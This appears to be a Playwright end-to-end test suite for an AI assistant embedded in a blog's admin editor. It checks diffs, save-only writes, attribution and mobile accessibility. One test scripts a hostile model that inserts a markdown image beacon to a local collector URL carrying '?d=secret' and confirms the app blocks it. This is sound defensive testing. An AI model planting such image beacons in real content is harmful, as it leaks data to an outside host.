import path from 'node:path'
import Database from 'better-sqlite3'
import type { Page } from '@playwright/test'
import { ADMIN, expect, loginAsAdmin, seriousA11yViolations, test, undersizedTargets } from './fixtures'

/**
 * Ask AI from an open editor (stage M6, design §7.8, §12.4), on the
 * standalone production build scripts/ai-e2e.sh starts, with
 * tests/helpers/fake-llm.mjs as an ordinary Custom provider:
 *
 *   - Apply to editor: the suggestion's diff is shown first, nothing is
 *     written to the site until the owner saves, the editor is AI-touched in
 *     between, and the save is attributed ("AI-suggested · … · saved on …" in
 *     Activity and in the item's history);
 *   - the local collector: a hostile model's remote image — in a change it
 *     tries to make and in its reply — reaches the collector neither from the
 *     server nor from the browser;
 *   - Open in editor from a waiting proposal, and the panel on a phone, in
 *     dark mode with reduced motion: axe clean, 44 px targets, no overflow.
 */
const FAKE = process.env.E2E_FAKE_LLM_URL || ''
const DATA_DIR = process.env.E2E_SERVER_DATA_DIR || ''

function aiDb(name: 'auth.db' | 'ai.db'): Database.Database {
  return new Database(path.join(DATA_DIR, name), { fileMustExist: true, timeout: 5000 })
}

function setAiAccess(on: boolean): void {
  const db = aiDb('auth.db')
  try {
    db.prepare('UPDATE ai_settings SET enabled = ? WHERE id = 1').run(on ? 1 : 0)
    if (!on) {
      db.prepare('DELETE FROM ai_provider_keys').run()
      db.prepare('UPDATE ai_settings SET default_provider_id = NULL WHERE id = 1').run()
    }
  } finally {
    db.close()
  }
}

async function enqueue(...turns: unknown[]): Promise<void> {
  const res = await fetch(`${FAKE}/__fake/enqueue`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ turns }) })
  expect(res.status).toBe(200)
}

async function collected(): Promise<Array<{ path: string }>> {
  return ((await (await fetch(`${FAKE}/__fake/collected`)).json()) as { collected: Array<{ path: string }> }).collected
}

/** A same-origin JSON request from the page (the admin cookie and the proxy's CSRF rules apply). */
async function inPage(page: Page, url: string, init: { method?: string; body?: unknown } = {}): Promise<{ status: number; etag: string | null; json: any }> {
  return page.evaluate(
    async ({ url, init }) => {
      const res = await fetch(url, { method: init.method ?? 'GET', headers: init.body !== undefined ? { 'content-type': 'application/json' } : {}, body: init.body !== undefined ? JSON.stringify(init.body) : undefined, credentials: 'same-origin' })
      return { status: res.status, etag: res.headers.get('etag'), json: await res.json().catch(() => null) }
    },
    { url, init },
  )
}

async function idle(page: Page): Promise<void> {
  await expect(page.getByTestId('composer-stop')).toHaveCount(0, { timeout: 30_000 })
  await expect(page.locator('[data-turn="live"], [data-pending="true"]')).toHaveCount(0, { timeout: 30_000 })
}

async function send(page: Page, text: string): Promise<void> {
  const box = page.locator('#ask-composer')
  await box.fill(text)
  await box.press('Enter')
}

test.describe('@ai editor bridge', () => {
  test.skip(!ADMIN.email || !ADMIN.password, 'ADMIN_EMAIL / ADMIN_PASS not set')
  test.describe.configure({ mode: 'serial' })
  let page: Page
  /** A draft made for this run: its save takes a version snapshot, so its history can name the save. */
  const slug = `e2e-bridge-${Date.now().toString(36)}`
  const BODY = 'The bridge carries text from a model to the editor.\n\nNothing is saved until the owner saves.'

  test.beforeAll(async ({ browser }) => {
    expect(FAKE, 'E2E_FAKE_LLM_URL (scripts/ai-e2e.sh)').toBeTruthy()
    expect(DATA_DIR, 'E2E_SERVER_DATA_DIR (scripts/ai-e2e.sh)').toBeTruthy()
    setAiAccess(true)
    const context = await browser.newContext({ baseURL: process.env.E2E_BASE_URL })
    page = await context.newPage()
    await loginAsAdmin(page, { fresh: true })
    await page.goto('/admin')
    const added = await inPage(page, '/api/admin/ai/providers', { method: 'POST', body: { preset: 'custom', wire: 'chat', baseUrl: `${FAKE}/v1`, apiKey: 'e2e-test-key-000000000000', defaultModel: 'fake-model', label: 'Test model (scripted)' } })
    expect(added.status, JSON.stringify(added.json)).toBe(201)
    const made = await inPage(page, '/api/admin/posts', { method: 'PUT', body: { slug, frontmatter: { title: 'Bridge draft', date: '2026-05-01', description: 'A draft for the bridge.', draft: true }, body: BODY, create: true } })
    expect(made.status, JSON.stringify(made.json)).toBe(200)
  })
  test.afterAll(async () => {
    setAiAccess(false)
    await page?.context().close()
  })
  test.beforeEach(async () => {
    await fetch(`${FAKE}/__fake/reset`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' })
  })

  test('Apply to editor: the diff first, nothing written until Save, the editor AI-touched in between, the save attributed in Activity and the history', async () => {
    test.setTimeout(120_000)
    const before = await inPage(page, `/api/admin/posts?slug=${slug}`)
    await page.goto(`/admin/blog/edit?slug=${slug}`)
    const ask = page.locator('[data-ask-ai]').first()
    await expect(ask).toBeVisible()
    await ask.click()
    const panel = page.getByRole('complementary', { name: 'AI assistant' })
    await expect(panel).toBeVisible()
    await expect(page.locator('#ask-composer')).toBeFocused()
    await expect(panel.locator('[data-chip="item"]')).toContainText(slug)

    await enqueue(
      {
        toolCalls: [
          {
            name: 'edit_content',
            args: { collection: 'blog', slug, base_version: before.etag, edits: [{ find: 'from a model to the editor', replace: 'from a model straight to the editor' }], frontmatter_patch: { description: 'A clearer description.' }, rationale: 'Tightened it.' },
          },
        ],
      },
      { text: 'I sent a suggestion to your editor.' },
    )
    await send(page, 'Tighten the first sentence and the description.')
    await expect(panel.locator('[data-suggestion-state="in_editor"]')).toBeVisible({ timeout: 30_000 })
    await idle(page)
    const changeId = (await panel.locator('[data-suggestion-state="in_editor"]').getAttribute('data-suggestion')) as string
    expect(changeId).toMatch(/^ch_[a-z2-7]{16}$/)
    const card = panel.locator(`[data-suggestion="${changeId}"]`)
    // The diff and what it says come first; the action after them.
    // Word-level marks inside a line carry a hidden "added:" / "removed:" label for screen readers.
    await expect(card.locator('ins').filter({ hasText: /description: A\b.*clearer description/ })).toBeVisible()
    await expect(card.locator('del').filter({ hasText: /description: A\b.*draft for the bridge/ })).toBeVisible()
    await expect(card.getByText('The model says:')).toBeVisible()
    await expect(card.getByTestId('suggestion-apply')).toBeVisible()
    const order = await card.evaluate((el) => {
      const diff = el.querySelector('ins')
      const apply = el.querySelector('[data-testid="suggestion-apply"]')
      return !!diff && !!apply && !!(diff.compareDocumentPosition(apply) & Node.DOCUMENT_POSITION_FOLLOWING)
    })
    expect(order, 'the diff is above Apply to editor').toBe(true)
    const unchanged = await inPage(page, `/api/admin/posts?slug=${slug}`)
    expect([unchanged.etag, unchanged.json.body]).toEqual([before.etag, BODY])

    await card.getByTestId('suggestion-apply').click()
    await expect(panel.getByTestId('suggestion-applied')).toBeVisible()
    await expect(page.getByTestId('ai-touched-badge')).toBeVisible()
    await expect(page.locator('#item-description')).toHaveValue('A clearer description.')
    await expect(page.locator('.ProseMirror')).toContainText('from a model straight to the editor')
    const stillUnchanged = await inPage(page, `/api/admin/posts?slug=${slug}`)
    expect(stillUnchanged.etag, 'Apply writes nothing to the site').toBe(before.etag)

    await page.getByRole('button', { name: /^Save draft$|^Save$/ }).first().click()
    await expect(page.getByTestId('ai-touched-badge')).toHaveCount(0, { timeout: 15_000 })
    const saved = await inPage(page, `/api/admin/posts?slug=${slug}`)
    expect(saved.json.body).toContain('from a model straight to the editor')
    expect(saved.json.frontmatter.description).toBe('A clearer description.')
    expect(saved.json.frontmatter.draft, 'a plain Save keeps the draft a draft').toBe(true)
    await expect
      .poll(async () => (await inPage(page, `/api/admin/ai/changes/${changeId}`)).json.state, { timeout: 10_000 })
      .toBe('applied')
    const change = await inPage(page, `/api/admin/ai/changes/${changeId}`)
    expect([change.json.result.version, change.json.result.savedInEditor]).toEqual([saved.etag, true])
    await expect(card).toHaveAttribute('data-suggestion-state', 'applied')
    await expect(card.getByTestId('suggestion-closed')).toHaveText('Saved in the editor.')

    const activity = await inPage(page, '/api/admin/activity?limit=10')
    const rows = (activity.json.entries ?? activity.json.items ?? []) as Array<{ summary: string; device: string | null }>
    expect(rows.find((r) => r.summary === `Saved AI-suggested edits to post ${slug}`)?.device ?? '').toMatch(/^AI-suggested · Test model \(scripted\) · fake-model · saved on /)
    // The item's history names the save that replaced the version before it.
    await page.getByTestId('ask-close').click()
    await page.getByRole('button', { name: 'More actions' }).click()
    await page.getByRole('menuitem', { name: 'History…' }).click()
    await expect(page.getByRole('dialog').getByText(/AI-suggested · Test model \(scripted\)/).first()).toBeVisible()
    await page.keyboard.press('Escape')
  })

  test('a hostile model’s remote image reaches the local collector neither from the server nor from the browser', async () => {
    test.setTimeout(120_000)
    const fakeOrigin = new URL(FAKE).origin
    const browserHits: string[] = []
    page.on('request', (r) => {
      if (r.url().startsWith(fakeOrigin)) browserHits.push(r.url())
    })
    const at = await inPage(page, `/api/admin/posts?slug=${slug}`)
    await page.goto(`/admin/blog/edit?slug=${slug}`)
    await page.locator('[data-ask-ai]').first().click()
    // The panel keeps this page's conversation for the tab: start a new one.
    const panel = page.getByRole('complementary', { name: 'AI assistant' })
    await panel.getByRole('button', { name: 'New chat' }).click()
    await expect(page.locator('#ask-composer')).toBeFocused()
    await expect(panel.locator('[data-suggestion]')).toHaveCount(0)
    // + Context (PRODUCT §4.6): "@" opens one combobox over the site; a pick is a chip; one click removes it.
    await page.locator('#ask-composer').type('@')
    const combo = panel.getByRole('combobox', { name: 'Attach a post, page or image' })
    await expect(combo).toBeFocused()
    await expect(page.locator('#ask-composer')).toHaveValue('')
    await combo.fill('/now')
    await expect(panel.getByRole('option').first()).toContainText('/now')
    await combo.press('Enter')
    await expect(panel.locator('[data-chip="page"]')).toContainText('/now')
    await expect(page.locator('#ask-composer')).toBeFocused()
    await panel.getByRole('button', { name: 'Remove Page · /now' }).click()
    await expect(panel.locator('[data-chip="page"]')).toHaveCount(0)
    await expect(page.locator('#ask-composer')).toBeFocused()
    await enqueue(
      { toolCalls: [{ name: 'edit_content', args: { collection: 'blog', slug, base_version: at.etag, edits: [{ find: 'Nothing is saved', replace: `![pixel](${FAKE}/__fake/collect/editor.png?d=secret) Nothing is saved` }] } }] },
      { toolCalls: [{ name: 'edit_content', args: { collection: 'blog', slug, base_version: at.etag, frontmatter_patch: { cover: `${FAKE}/__fake/collect/cover.png` } } }] },
      { text: 'Tried.' },
    )
    await send(page, 'Add a picture.')
    await idle(page)
    await expect(panel.getByText(/failed · REMOTE_IMAGE/).first()).toBeVisible()
    await expect(panel.locator('[data-suggestion]')).toHaveCount(0)
    await send(page, '/hostile')
    await idle(page)
    await expect(panel.getByText('[image not loaded]').first()).toBeVisible()
    await page.waitForTimeout(1500)
    expect(await collected(), 'nothing reached the collector from the server or the browser').toEqual([])
    expect(browserHits, 'the browser asked the other origin for nothing').toEqual([])
    const unchanged = await inPage(page, `/api/admin/posts?slug=${slug}`)
    expect(unchanged.etag).toBe(at.etag)
  })

  test('Open in editor: a waiting /now edit opens in its editor, ready to apply; applying and saving attribute it', async () => {
    test.setTimeout(120_000)
    const now = await inPage(page, '/api/admin/page?name=now')
    const words = String(now.json.body).split(/\s+/).filter(Boolean).slice(0, 2).join(' ')
    expect(words.length).toBeGreaterThan(2)
    await page.goto('/admin/ai')
    await expect(page.locator('#ai-composer')).toBeVisible()
    await enqueue({ toolCalls: [{ name: 'propose_page_edit', args: { name: 'now', edits: [{ find: words, replace: `${words} (proposed)` }], base_version: now.etag, rationale: 'A clearer /now.' } }] }, { text: 'Proposed.' })
    await page.locator('#ai-composer').fill('Propose a clearer /now.')
    await page.locator('#ai-composer').press('Enter')
    const open = page.getByTestId('change-open-in-editor').first()
    await expect(open).toBeVisible({ timeout: 30_000 })
    await open.click()
    await expect(page).toHaveURL(/\/admin\/now$/)
    await expect(page.locator('[data-suggestion-state="waiting"]')).toBeVisible({ timeout: 30_000 })
    const id = (await page.locator('[data-suggestion-state="waiting"]').getAttribute('data-suggestion')) as string
    const card = page.locator(`[data-suggestion="${id}"]`)
    await expect(card).toContainText('Opened from Changes')
    await card.getByTestId('suggestion-apply').click()
    await expect(page.getByTestId('ai-touched-badge')).toBeVisible()
    expect((await inPage(page, '/api/admin/page?name=now')).etag, 'nothing written before Save').toBe(now.etag)
    await page.getByRole('button', { name: 'Save', exact: true }).click()
    await expect(page.getByTestId('ai-touched-badge')).toHaveCount(0, { timeout: 15_000 })
    const after = await inPage(page, '/api/admin/page?name=now')
    expect(after.json.body).toContain(`${words} (proposed)`)
    await expect.poll(async () => (await inPage(page, `/api/admin/ai/changes/${id}`)).json.state, { timeout: 10_000 }).toBe('applied')
  })

  test('the panel on a phone, in dark mode with reduced motion: a bottom sheet, axe clean, 44 px targets, no sideways scroll', async ({ browser }) => {
    test.setTimeout(120_000)
    const context = await browser.newContext({ baseURL: process.env.E2E_BASE_URL, viewport: { width: 375, height: 812 }, colorScheme: 'dark', reducedMotion: 'reduce', storageState: await page.context().storageState() })
    const phone = await context.newPage()
    try {
      await phone.goto(`/admin/blog/edit?slug=${slug}`)
      const at = await inPage(phone, `/api/admin/posts?slug=${slug}`)
      await phone.getByRole('button', { name: 'More actions' }).click()
      await phone.getByRole('menuitem', { name: 'Ask AI' }).click()
      const sheet = phone.locator('[data-ask-panel="sheet"]')
      await expect(sheet).toBeVisible()
      await enqueue({ toolCalls: [{ name: 'edit_content', args: { collection: 'blog', slug, base_version: at.etag, edits: [{ find: 'The bridge', replace: 'This bridge' }], rationale: 'From a phone.' } }] }, { text: 'Sent to your editor.' })
      await phone.locator('#ask-composer').fill('One small change.')
      await phone.getByTestId('composer-send').click()
      await expect(sheet.locator('[data-suggestion-state="in_editor"]')).toBeVisible({ timeout: 30_000 })
      await idle(phone)
      expect(await seriousA11yViolations(phone)).toEqual([])
      expect(await undersizedTargets(phone)).toEqual([])
      const small = await sheet.evaluate((el) =>
        Array.from(el.querySelectorAll('button, a[href]'))
          .filter((b) => (b as HTMLElement).offsetParent && b.getBoundingClientRect().height > 1 && b.getBoundingClientRect().height < 44)
          .map((b) => (b.textContent || b.getAttribute('aria-label') || '').trim().slice(0, 40)),
      )
      expect(small, 'the sheet’s controls are 44 px tall on a phone').toEqual([])
      expect(await phone.evaluate(() => document.documentElement.scrollWidth - window.innerWidth)).toBeLessThanOrEqual(0)
      await sheet.getByTestId('suggestion-apply').click()
      await expect(sheet.getByTestId('suggestion-applied')).toBeVisible()
      await sheet.getByTestId('ask-close').click()
      await expect(phone.getByTestId('ai-touched-badge')).toBeVisible()
    } finally {
      await context.close()
    }
  })
})
